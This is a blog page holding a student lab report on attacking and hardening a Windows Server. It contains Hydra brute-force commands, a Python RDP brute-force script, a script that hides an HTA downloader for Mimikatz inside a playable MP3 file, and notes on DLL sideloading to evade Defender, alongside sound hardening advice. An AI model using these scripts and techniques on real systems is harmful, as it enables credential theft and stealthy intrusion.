</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;An error occurred: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    target_mp3 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./The_link_orginal.mp3&#34;</span>
</span></span><span style="display:flex;"><span>    file_to_insert <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;payload.hta&#34;</span>
</span></span><span style="display:flex;"><span>    output_mp3 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./The_link.mp3&#34;</span>
</span></span><span style="display:flex;"><span>    insert_file(target_mp3, file_to_insert, output_mp3)
</span></span></code></pre></div><p>Figures below show the properties of the edited file, its ability to be played back, and the execution of the file via <code>mshta</code> on the target user through RDP.</p>
<p><figure><img src="/itsi/y3/ex9/images/link_properties.png"><figcaption>
      <h4>Figure 28: Showing the properties of the mp3 file</h4>
    </figcaption>
</figure>

<figure><img src="/itsi/y3/ex9/images/listentiogn%20to%20the%20mp3%20file.png"><figcaption>
      <h4>Figure 29: Listening to the mp3 file</h4>
    </figcaption>
</figure>

<figure><img src="/itsi/y3/ex9/images/exepayload.png"><figcaption>
      <h4>Figure 30: Executing the payload inside the mp3 file</h4>
    </figcaption>
</figure>
</p>
<p>The ZIP file can now be extracted, and Mimikatz can be executed. However, since the user has virtually no permissionsâand Mimikatz requires elevated privilegesâit had no practical use in this scenario.</p>
<figure><img src="/itsi/y3/ex9/images/sadgemimikatz.png"><figcaption>
      <h4>Figure 31: Running privilege::debug in mimikatz</h4>
    </figcaption>
</figure>

<hr>
<h4 id="dll-side-loading-to-attempt-to-bypass-windows-defender">DLL Side-Loading to Attempt to Bypass Windows Defender</h4>
<p>DLL sideloading is a technique in which a built-in Windows binary is copied to a different path, and a custom-compiled DLL is placed in the same directory, hoping that the binary will load the malicious DLL instead of the intended one. To find such vulnerable binaries, there is a website called hijacklibs.net, which allows filtering DLLs by vendor and provides detection rules for each specific DLL. <!-- raw HTML omitted -->HijackLibs<sup id="fnref:17"><a href="#fn:17" class="footnote-ref" role="doc-noteref">17</a></sup><!-- raw HTML omitted --></p>
<p>To create your own DLL, you need the Microsoft x64 Native Developer Tools. You can then write the code for your DLL and compile it using:</p>
<pre tabindex="0"><code>cl /LD DismCore.c user32.lib 
</code></pre><p>I tried bundling Mimikatz into the DLL and sideloading it via a built-in Windows executable in an attempt to bypass Windows Defender. However, it was detected anyway.</p>
<p><figure><img src="/itsi/y3/ex9/images/dll-1.png"><figcaption>
      <h4>Figure 32: Opening a Messagebox with the dll</h4>
    </figcaption>
</figure>

<figure><img src="/itsi/y3/ex9/images/dll-2.png"><figcaption>
      <h4>Figure 33: Trying to run the script via the dll</h4>
    </figcaption>
</figure>
</p>
<hr>
<h4 id="how-to-detect-and-block-mimikatz">How to Detect and Block Mimikatz</h4>
<p>There are a multitude of ways to prevent Mimikatz, most of which come down to restricting access. For example, configuring the &ldquo;Debug Program&rdquo; policy to be accessible only to local administrators, disabling outdated protocols such as <code>WDigest</code>, and enforcing strong password policies.</p>
<hr>
<h2 id="references">References</h2>
<p><em>For a full bibliography, see the <a href="https://github.com/Stefanistkuhl/goobering/blob/master/itsi/y3/ex9/zotero.bib"  target="_blank" rel="noreferrer nofollow">original BibTeX file</a>.</em></p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p>Microsoft Corporation. Server Message Block (SMB) Protocol Versions 2 and 3. <a href="https://winprotocoldoc.z19.web.core.windows.net/MS-SMB2/%5bMS-SMB2%5d.pdf"  target="_blank" rel="noreferrer nofollow">source</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2">
<p>Microsoft Community Hub. Controlling SMB Dialects. <a href="https://techcommunity.microsoft.com/blog/filecab/controlling-smb-dialects/860024"  target="_blank" rel="noreferrer nofollow">source</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:3">
<p>Wikipedia. NTLMSSP. <a href="https://en.wikipedia.org/w/index.php?title=NTLMSSP&amp;oldid=990800521"  target="_blank" rel="noreferrer nofollow">source</a>&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:4">
<p>Microsoft Docs. [MS-SMB2]: SMB2 SESSION_SETUP Request. <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/5a3c2c28-d6b0-48ed-b917-a86b2ca4575f"  target="_blank" rel="noreferrer nofollow">source</a>&#160;<a href="#fnref:4" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:5">
<p>Windows OS Hub. Managing Administrative Shares (Admin$, IPC$, C$) on Windows. <a href="https://woshub.com/enable-remote-access-to-admin-shares-in-workgroup/"  target="_blank" rel="noreferrer nofollow">source</a>&#160;<a href="#fnref:5" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:6">
<p>Wikipedia. Remote Desktop Protocol. <a href="https://en.wikipedia.org/w/index.php?title=Remote_Desktop_Protocol&amp;oldid=1245904842"  target="_blank" rel="noreferrer nofollow">source</a>&#160;<a href="#fnref:6" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:7">
<p>Microsoft Docs. Credential Security Support Provider - Win32 apps. <a href="https://learn.microsoft.com/en-us/windows/win32/secauthn/credential-security-support-provider"  target="_blank" rel="noreferrer nofollow">source</a>&#160;<a href="#fnref:7" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:8">
<p>Cloudflare. What happens in a TLS handshake? <a href="https://www.cloudflare.com/learning/ssl/what-happens-in-a-tls-handshake/"  target="_blank" rel="noreferrer nofollow">source</a>&#160;<a href="#fnref:8" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:9">
<p>GitHub. devnulli/EvlWatcher: a &ldquo;fail2ban&rdquo; style modular log file analyzer for windows. <a href="https://github.com/devnulli/EvlWatcher"  target="_blank" rel="noreferrer nofollow">source</a>&#160;<a href="#fnref:9" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:10">
<p>Windows OS Hub. Disable NTLM Authentication in Windows. <a href="https://woshub.com/disable-ntlm-authentication-windows"  target="_blank" rel="noreferrer nofollow">source</a>&#160;<a href="#fnref:10" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:11">
<p>The Windows Club. How to restrict the number of Login attempts in Windows 11/10. <a href="https://www.thewindowsclub.com/how-to-restrict-the-number-of-login-attempts-in-windows-7"  target="_blank" rel="noreferrer nofollow">source</a>&#160;<a href="#fnref:11" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:12">
<p>Medium. Detailed mimikatz guide. <a href="https://medium.com/@redfanatic7/detailed-mimikatz-guide-87176fd526c0"  target="_blank" rel="noreferrer nofollow">source</a>&#160;<a href="#fnref:12" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a>&#160;<a href="#fnref1:12" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:13">
<p>CrowdStrike. What is a Pass-the-Hash Attack? <a href="https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/pass-the-hash-attack"  target="_blank" rel="noreferrer nofollow">source</a>&#160;<a href="#fnref:13" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:14">
<p>MITRE ATT&amp;CK. Use Alternate Authentication Material: Pass the Ticket. <a href="https://attack.mitre.org/techniques/T1550/003"  target="_blank" rel="noreferrer nofollow">source</a>&#160;<a href="#fnref:14" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:15">
<p>PowerSploit. PowerShellMafia/PowerSploit. <a href="https://github.com/PowerShellMafia/PowerSploit"  target="_blank" rel="noreferrer nofollow">source</a>&#160;<a href="#fnref:15" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:16">
<p>John Hammond. this MP3 file is malware. <a href="https://www.youtube.com/watch?v=25NvCdFSkA4"  target="_blank" rel="noreferrer nofollow">source</a>&#160;<a href="#fnref:16" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:17">
<p>HijackLibs. dismcore.dll on HijackLibs. <a href="https://hijacklibs.net/entries/microsoft/built-in/dismcore.html"  target="_blank" rel="noreferrer nofollow">source</a>&#160;<a href="#fnref:17" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
</main>



<br>

<footer>

<script defer>
  document.addEventListener("keydown", function (e) {
    if (document.activeElement.isContentEditable) {
      return false;
    }
    if (document.activeElement.tagName == "INPUT") {
      return false;
    }
    if (e.altKey || e.ctrlKey || e.shiftKey) {
      return false;
    }
    var key = e.key;
    if (key === "h") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = "/";
    } else if (key === "t") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = `https://${location.hostname}/tags`;
    } else if (key === "i") {
      e.preventDefault();
      e.stopPropagation();
      const inputs = document.querySelectorAll("input");
      for (let i = 0; i < inputs.length; i++) {
        if (inputs[i].offsetParent !== null) {
          inputs[i].selectionStart = inputs[i].selectionEnd =
            inputs[i].value.length;
          inputs[i].focus();
          break;
        }
      }
    }
    return false;
  });
</script>


<script defer>
  function throttle(fn, wait) {
    var time = Date.now();
    return function () {
      var now = Date.now();
      if (time + wait - now < 0) {
        fn();
        time = now;
      }
    };
  }

  function scrollHandler() {
    const anchors = Array.from(document.querySelectorAll("body h2, body h3"));

    function scrollCallback() {
      var scrollTop = window.pageYOffset || document.documentElement.scrollTop;

      
      for (var i = 0; i < anchors.length; i++) {
        var anchorId = anchors[i].getAttribute("id");
        var link = document.querySelector(
          'nav ul li a[href="#' + anchorId + '"]',
        );
        if (link) {
          link.classList.remove("active-toc");
        }
      }

      
      for (var i = anchors.length - 1; i >= 0; i--) {
        var offsetTop = anchors[i].offsetTop;
        if (scrollTop > offsetTop - 75) {
          var anchorId = anchors[i].getAttribute("id");
          var link = document.querySelector(
            'nav ul li a[href="#' + anchorId + '"]',
          );
          if (link) {
            link.classList.add("active-toc");
            break;
          }
        }
      }
    }

    window.addEventListener("scroll", throttle(scrollCallback, 200));
  }
  setTimeout(scrollHandler, 100);
</script>

<script defer>
  function addCopyButtonToCodeBlocks() {
    
    
    const codeBlocks = document.querySelectorAll(
      'code[class^="language-"]:not(.output):not([class*="language-console"])',
    );

    codeBlocks.forEach((codeBlock) => {
      const copyButton = document.createElement("button");
      copyButton.classList.add("copy-code-button");
      copyButton.innerHTML = "copy";

      
      copyButton.addEventListener("click", () => {
        
        const elements = codeBlock.querySelectorAll(".cl");
        let codeToCopy = "";
        elements.forEach((element) => {
          codeToCopy += element.innerText;
        });
        navigator.clipboard.writeText(codeToCopy);

        
        copyButton.innerHTML = "copied!";
        setTimeout(() => {
          copyButton.innerHTML = "copy";
        }, 1500);
      });

      
      codeBlock.parentNode.before(copyButton);
    });
  }
  setTimeout(function () {
    addCopyButtonToCodeBlocks();
  }, 100);
</script>

<script>
window.store = {
    
    "http:\/\/localhost:1313\/posts\/": {
        "title": "Posts",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/posts\/"
    },
    
    "http:\/\/localhost:1313\/": {
        "title": "Silly blog",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/"
    },
    
    "http:\/\/localhost:1313\/posts\/test\/test\/": {
        "title": "Test",
        "tags": [],
        "content": "This article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.\nHeadings The following HTML \u0026lt;h1\u0026gt;â\u0026lt;h6\u0026gt; elements represent six levels of section headings. \u0026lt;h1\u0026gt; is the highest section level while \u0026lt;h6\u0026gt; is the lowest.\nH1 H2 H3 H4 H5 H6 Paragraph Xerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.\nItatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.\nBlockquotes The blockquote element represents content that is quoted from another source, optionally with a citation which must be within a footer or cite element, and optionally with in-line changes such as annotations and abbreviations.\nBlockquote without attribution Tiam, ad mint andaepu dandae nostion secatur sequo quae. Note that you can use Markdown syntax within a blockquote.\nBlockquote with attribution Don\u0026rsquo;t communicate by sharing memory, share memory by communicating. â Rob Pike1\nTables Tables aren\u0026rsquo;t part of the core Markdown spec, but Hugo supports supports them out-of-the-box.\nName Age Bob 27 Alice 23 Inline Markdown within tables Italics Bold Code italics bold code Code Blocks Code block with backticks \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Code block indented with four spaces \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026quot;utf-8\u0026quot;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Code block with Hugo\u0026rsquo;s internal highlight shortcode \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; List Types Ordered List First item Second item Third item Unordered List List item Another item And another item Nested list Fruit Apple Orange Banana Dairy Milk Cheese Other Elements â abbr, sub, sup, kbd, mark GIF is a bitmap image format.\nH2O\nXn + Yn = Zn\nPress CTRL+ALT+Delete to end the session.\nMost salamanders are nocturnal, and hunt for insects, worms, and other small creatures.\n:3 Figure 1: ynails \\{\\{\u0026lt; figure src=\u0026quot;/images/test/ynails.png\u0026quot; title=\u0026quot;Figure 1: ynails\u0026quot; \u0026gt;\\}\\}\nThe above quote is excerpted from Rob Pike\u0026rsquo;s talk during Gopherfest, November 18, 2015.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n", 
        "url": "http:\/\/localhost:1313\/posts\/test\/test\/"
    },
    
    "http:\/\/localhost:1313\/about\/": {
        "title": "About",
        "tags": [],
        "content": " ", 
        "url": "http:\/\/localhost:1313\/about\/"
    },
    
    "http:\/\/localhost:1313\/categories\/": {
        "title": "Categories",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/categories\/"
    },
    
    "http:\/\/localhost:1313\/posts\/itsi\/exercise-9\/security-test-of-windows-server\/": {
        "title": "Security test of Windows Server",
        "tags": [],
        "content": " Note: this was converted using from LaTeX to Markdown using Chat GPT 4.1 the original pdf can be found here along with the bibliography\nTesting Windows server security Laboratory protocol\nExercise 9: Testing Windows server security\nFigure: Grouplogo Subject: ITSI\nClass: 3AHITN\nName: Stefan FÃ¼rst, Justin Tremurici\nGroup Name/Number: Name here/12\nSupervisor: SPAC, ZIVK\nExercise dates: 14.03.2025 | 21.03.2025 | 28.03.2025 | 04.04.2025\nSubmission date: 11.04.2025\nTable of Contents Task definition Summary Complete network topology of the exercise Exercise Execution References Task definition This task was conducted using a combination of manual configuration and automated attack tools to evaluate the security posture of a Windows Server environment. The environment setup involved preparing both the target system and an attacker system running Kali Linux, which was equipped with tools such as Hydra for brute-force attacks and Wireshark for network traffic analysis.\nInitially, the target Windows Server was configured by creating a new local user account named testuser with the password passwort. A network share was created using New-SmbShare, and permissions were assigned to testuser to grant access. Concurrently, Wireshark was deployed on either the server or an intermediary device to capture and analyze traffic related to the attacks.\nTo simulate credential-based attacks, Hydra was used to conduct brute-force attempts on the SMB protocol:\nhydra -l testuser -P /path/to/passwordlist.txt smb://\u0026lt;IP-ADDRESS\u0026gt; The time to successful login was measured and compared between weak (e.g., passwort) and strong (e.g., P@ssw0rd123!) password configurations. Network traffic was captured and filtered using the expression tcp.port == 445, enabling detailed inspection of failed and successful authentication attempts.\nA second brute-force attack was executed against the Remote Desktop Protocol (RDP). RDP was enabled through system settings, and testuser was added to the Remote Desktop Users group. Hydra was again utilized for this. Wireshark was used to capture the RDP traffic (tcp.port == 3389) for comparison against the SMB-based attack. Observations highlighted protocol-level differences in how failed and successful login attempts were processed and exposed.\nFollowing the attacks, two mitigation techniques were researched and implemented to harden the system. Group Policy Objects (GPOs) were configured to enforce account lockout policies and limit RDP access. These changes were validated by re-running attacks and observing reduced effectiveness due to increased security controls.\nAdditionally, privilege escalation techniques were examined using Mimikatz. Requirements for successful execution were researched, including necessary privileges and system policies. As a bonus, Mimikatz was tested on the server to extract credentials and security tokens. The analysis revealed sensitive credential information, underscoring the importance of disabling credential caching and applying strict administrative controls.\nSummary In this exercise, we used Hydra for brute-force attacks on various services. However, due to issues with Hydra\u0026rsquo;s support for RDP brute-forcing, we created a custom Python script that utilized the FreeRDP command to perform the RDP brute-force attacks. This solution allowed us to bypass the limitations of Hydra and simulate RDP credential stuffing attacks effectively.\nTo enhance the security of the target system, we adjusted Group Policy settings, specifically disabling NTLM authentication and modifying account lockout policies. These changes were intended to limit the success of brute-force attacks by reducing the number of login attempts allowed.\nWe also deployed EvWatcher to monitor and limit attack attempts, ensuring that further malicious actions would be detected and blocked. For privilege escalation, we used MSHTA in combination with an MP3 file to bypass security and deploy Mimikatz onto the target system. To ensure Mimikatz could function, we disabled Windows Defender.\nMimikatz is a powerful tool used to extract credentials, manipulate security tokens, and perform privilege escalation on Windows systems. It can dump plaintext passwords, password hashes, and Kerberos tickets from memory, providing an attacker with sensitive information. This exercise highlighted the importance of securing systems against such attacks by using strong policies, disabling insecure protocols like NTLM, and employing endpoint protection to prevent tools like Mimikatz from successfully exploiting the system.\nComplete network topology of the exercise Figure 1: Complete network topology of the exercise Exercise Execution Setting Up the Exercise Environment To meet the initial requirements of this exercise, the script from last time was simplified to create only five test users, along with corresponding security groups. Most randomly generated elements were removed, leaving only three shares on the C: drive. This can be verified in the Computer Management utility under the Users, Shares, and Groups categories, as shown in the figures below.\nFigure 2: Verifying the creation of the users Figure 3: Verifying the creation of the groups Figure 4: Verifying the creation of the shares Brute-Forcing SMB with Hydra Since part of the setup involved assigning weak passwords to the users, they can be easily brute-forced with Hydra using the following command:\nhydra -l user1 -P /usr/share/wordlists/rockyou.txt -t 4 192.168.56.102 smb2 -I This command consists of the -l flag to specify the user to target, and the -P flag to specify the list of passwords to useâin this case, the RockYou wordlist. Note that -P (uppercase) indicates a list of passwords, whereas -p (lowercase) is used for a single password. The -t flag sets the number of threads to use for the attack. 192.168.56.102 sets the target IP address, and smb2 specifies the protocol to use. The -I flag tells Hydra to ignore restoring progress from an earlier session.\nAfter running the command, we can see that password123_ is not a secure password, as it gets cracked in just one second.\nFigure 5: Obtaining the password for the smb share Analyzing Network Traffic with Wireshark By filtering for tcp.port == 445, we can examine the SMB-related network traffic being sent and received, and analyze the authentication process taking place alongside it.\nThe first SMB packet is sent using version 1 instead of version 2, despite version 2 being specified in the command. This is explained in the SMB specification Microsoft Corporation1. The Negotiate Protocol Request informs the server of the SMB dialects (i.e., versions) the client supports, which is essentially an array of supported versions. Microsoft Community Hub2 Figure 6: Inspecting the first Negotiate Protocol Request The server responds with a Negotiate Protocol Response, replying with the preferred SMB dialect and an array of capabilities. Figure 7: Viewing the Negotiate Protocol Response The client responds with its own list of supported capabilities. Figure 8: Viewing the second Negotiate Protocol Request The server specifies the preferred dialect from the clientâs dialect arrayâhere, SMB 3.1.1. Figure 9: Viewing the second Negotiate Protocol Response After a dialect and capabilities have been selected, a Session Setup Request is sent, initiating the authentication process using the GSS-API (Generic Security Service Application Program Interface). This is used alongside NTLMSSP, which stands for NT LAN Manager Security Support Providerâa binary messaging protocol developed by Microsoft to facilitate NTLM challenge-response authentication and to negotiate integrity and confidentiality options. Wikipedia3 Figure 10: Viewing the Session Setup Request The server responds with STATUS_MORE_PROCESSING_REQUIRED, indicating that guest access is disabled and authentication is required to connect to this SMB share. Microsoft Docs4 Figure 11: Viewing the Session Setup Response The client sends another Session Setup Request with NTLMSSP_AUTH, including the domain name, user name, and session key. Figure 12: Viewing the second Session Setup Request If the authentication fails, the server responds with STATUS_LOGON_FAILURE. Figure 13: Viewing the second Session Setup Response If the authentication succeeds, the NT Status field in the header of the Session Setup Response is set to STATUS_SUCCESS. This is followed by a Tree Connect Request to access a share on the server. Since I did not specify a share, Hydra defaults to the administrative share $IPC, which is used to communicate with programs via named pipes over the network. Windows OS Hub5 Figure 14: Viewing the successful Session Setup Response Figure 15: Viewing the Tree Connect Request Figure 16: Viewing the Tree Connect Response Brute-Forcing RDP RDP is a proprietary protocol developed by Microsoft that allows a user to connect to another computer with a graphical interface. Wikipedia6\nHowever, Hydra did not detect my installation of libfreerdp3, so I created a custom Python RDP brute-forcing script based on the xfreerdp3 command.\nFigure 17: Hydra showing that it\u0026#39;s not compiled with freerdp support Figure 18: Showing that the libfreerdp3 package is installed but not found Using my script, I can now obtain the credentials and generate a command to connect to the server.\nFigure 19: Obtaining the credentials of the user Explaining My Own RDP Brute-Forcing Script The script uses threading and the xfreerdp3 command with +auth-only to check credentials. Here is an abstracted version:\nimport subprocess, threading, argparse, concurrent.futures password_found = threading.Event() def run_command(host, user, port, password): cmd = [\u0026#34;xfreerdp3\u0026#34;, f\u0026#34;/v:{host}:{port}\u0026#34;, f\u0026#34;/u:{user}\u0026#34;, f\u0026#34;/p:{password}\u0026#34;, \u0026#34;+auth-only\u0026#34;] try: result = subprocess.run(cmd, capture_output=True, text=True) return result.returncode, result.stdout.strip(), result.stderr.strip() except: return -1, \u0026#34;\u0026#34;, \u0026#34;Error\u0026#34; def worker(args, passwords): for pw in passwords: if password_found.is_set(): return code, _, _ = run_command(args.host, args.user, args.port, pw) if code == 131: print(f\u0026#34;SUCCESS: {pw}\u0026#34;) password_found.set() return True return False def main(): parser = argparse.ArgumentParser() parser.add_argument(\u0026#34;-u\u0026#34;, \u0026#34;--user\u0026#34;, required=True) # ... other arguments ... args = parser.parse_args() pwlist = [] with open(args.Password_list) as f: for line in f: pwlist.append(line.rstrip(\u0026#39;\\n\u0026#39;)) if args.threads == 1: worker(args, pwlist) else: # ...split pwlist and run with ThreadPoolExecutor... pass if not password_found.is_set(): print(\u0026#34;Password not found\u0026#34;) Analyzing Network Traffic with Wireshark When inspecting the traffic of an RDP connection, only two RDP requests are sent: a Negotiate Request and a Negotiate Response. The server replies with the protocol to use, e.g., CredSSP (Credential Security Support Provider). Microsoft Docs7\nFigure 20: Viewing the RDP Negotiate Request Figure 21: Viewing the RDP Negotiate Response Figure 22: Viewing the Handshake and Termination of the Connection After selecting the protocol, a TLS handshake occurs between the client and the server. During this handshake, both parties agree on the TLS version, choose a cipher suite, authenticate the serverâs identity via its public key and the digital signature of an SSL certificate authority, and generate session keys in order to use symmetric encryption after the handshake is complete. Cloudflare8 Hardening Windows Against Brute-Force Attacks Using EvLWatcher for Rate Limiting To set up rate limiting, I used a fail2ban-style tool for Windows called EvLWatcher. After running the setup executable, no additional configuration is necessary, and it can essentially be left to run in the background. GitHub9\nFigure 23: Observing The Attackers IP-Address getting temporarily banned Disabling NTLM Authentication NTLM is a legacy authentication protocol that dates back to Windows NT. Although Microsoft introduced a more secure alternative called Kerberos in 1989, NTLM is still used in some domain networks and remains enabled for backward compatibility. One of NTLM\u0026rsquo;s major flaws is that it stores password hashes in plaintext in the memory of its servers, which can be extracted using pass-the-hash tools such as Mimikatz. Windows OS Hub10\nFigure 24: Disabling NTLM authentication for all accounts Figure 25: Hydra failing without being able to use NTLM Configuring Login Timeout Settings To slow down RDP brute-forcing, account lockout can be configured in the Local Security Policy editor under Account Lockout Policy. The Windows Club11\nFigure 26: Showing the lockout policy Mimikatz: An Introduction Mimikatz is a post-exploitation tool designed to extract credential information. Medium12\nWhat Can Mimikatz Do? The main features of Mimikatz include extracting credentials from memory or disk-based password stores. This includes plaintext passwords, PINs, Kerberos tickets, and NTLM password hashes. Mimikatz achieves this through a variety of techniques, such as Pass-the-Hash, which allows attackers to use captured NTLM hashes to create new authenticated sessions on the networkâwithout needing to know the userâs actual password. CrowdStrike13\nPass-the-Hash: Allows attackers to use captured NTLM hashes to create new authenticated sessions. Pass-the-ticket: Bypasses normal system access controls by stealing a valid Kerberos ticket. There are two notable types of forged Kerberos tickets: Silver and Golden tickets. Medium12 MITRE ATT\u0026amp;CK14\nHow to Use Mimikatz There are multiple ways to invoke Mimikatz on a target system. The simplest method is to download a compiled release from the official GitHub repository. However, there are also pre-built PowerShell scripts and commands that streamline its execution, such as Invoke-Mimikatz from the PowerSploit framework. PowerSploit15\nRunning Mimikatz To run Mimikatz on the target system, I wanted to try a unique or more creative method rather than simply downloading and executing the Mimikatz binary directly. Inspired by a video from security professional and YouTuber John Hammond, where he analyzes a malware sample hidden inside an MP3 file that uses mshta.exe to execute a payload, I explored a similar idea. John Hammond16\nTo do this, I used an MP3 file in which I embedded the plain text of an HTA script that downloads Mimikatz. The MP3 file appears normal and can be played, but if executed using mshta, it executes the script.\nFigure 27: Showing the payload in the mp3 file The payload runs a PowerShell command in a hidden window that downloads Mimikatz and saves it as msedge_installer.zip.\nTo insert my payload into an MP3 file, I wrote the following Python script:\nimport random def insert_file(target_path, payload_path, output_path): try: with open(target_path, \u0026#39;rb\u0026#39;) as target_file: target_content = target_file.read() with open(payload_path, \u0026#39;rb\u0026#39;) as payload_content: payload = payload_content.read() target_size = len(target_content) if target_size == 0: print(\u0026#34;Error: Target file is empty.\u0026#34;) return middle_index = target_size // 2 random_offset_range = target_size // 4 random_offset = random.randint(-random_offset_range, random_offset_range) insertion_point = max(0, min(target_size, middle_index + random_offset)) new_content = target_content[:insertion_point] + payload + target_content[insertion_point:] with open(output_path, \u0026#39;wb\u0026#39;) as output_file: output_file.write(new_content) print(f\u0026#34;File \u0026#39;{payload_path}\u0026#39; inserted at position {insertion_point} in \u0026#39;{target_path}\u0026#39; and saved as \u0026#39;{output_path}\u0026#39;.\u0026#34;) except FileNotFoundError: print(\u0026#34;Error: One or both of the input files were not found.\u0026#34;) except Exception as e: print(f\u0026#34;An error occurred: {e}\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: target_mp3 = \u0026#34;./The_link_orginal.mp3\u0026#34; file_to_insert = \u0026#34;payload.hta\u0026#34; output_mp3 = \u0026#34;./The_link.mp3\u0026#34; insert_file(target_mp3, file_to_insert, output_mp3) Figures below show the properties of the edited file, its ability to be played back, and the execution of the file via mshta on the target user through RDP.\nFigure 28: Showing the properties of the mp3 file Figure 29: Listening to the mp3 file Figure 30: Executing the payload inside the mp3 file The ZIP file can now be extracted, and Mimikatz can be executed. However, since the user has virtually no permissionsâand Mimikatz requires elevated privilegesâit had no practical use in this scenario.\nFigure 31: Running privilege::debug in mimikatz DLL Side-Loading to Attempt to Bypass Windows Defender DLL sideloading is a technique in which a built-in Windows binary is copied to a different path, and a custom-compiled DLL is placed in the same directory, hoping that the binary will load the malicious DLL instead of the intended one. To find such vulnerable binaries, there is a website called hijacklibs.net, which allows filtering DLLs by vendor and provides detection rules for each specific DLL. HijackLibs17\nTo create your own DLL, you need the Microsoft x64 Native Developer Tools. You can then write the code for your DLL and compile it using:\ncl /LD DismCore.c user32.lib I tried bundling Mimikatz into the DLL and sideloading it via a built-in Windows executable in an attempt to bypass Windows Defender. However, it was detected anyway.\nFigure 32: Opening a Messagebox with the dll Figure 33: Trying to run the script via the dll How to Detect and Block Mimikatz There are a multitude of ways to prevent Mimikatz, most of which come down to restricting access. For example, configuring the \u0026ldquo;Debug Program\u0026rdquo; policy to be accessible only to local administrators, disabling outdated protocols such as WDigest, and enforcing strong password policies.\nReferences For a full bibliography, see the original BibTeX file.\nMicrosoft Corporation. Server Message Block (SMB) Protocol Versions 2 and 3. 